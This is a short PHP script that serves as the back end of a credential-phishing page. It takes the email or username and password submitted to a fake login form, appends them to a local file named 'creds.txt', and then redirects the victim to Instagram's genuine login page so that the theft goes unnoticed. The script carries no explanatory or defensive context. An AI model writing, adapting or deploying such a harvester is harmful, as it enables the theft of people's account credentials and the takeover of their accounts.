<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = isset($_POST['email']) ? $_POST['email'] : 'No Email';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : 'No Password';

    $data = "Email/Username: " . $email . "\nPassword: " . $pass . "\n-------------------------\n";

    file_put_contents('creds.txt', $data, FILE_APPEND);

    header('Location: https://www.instagram.com/accounts/login/');
    exit();
}
?>
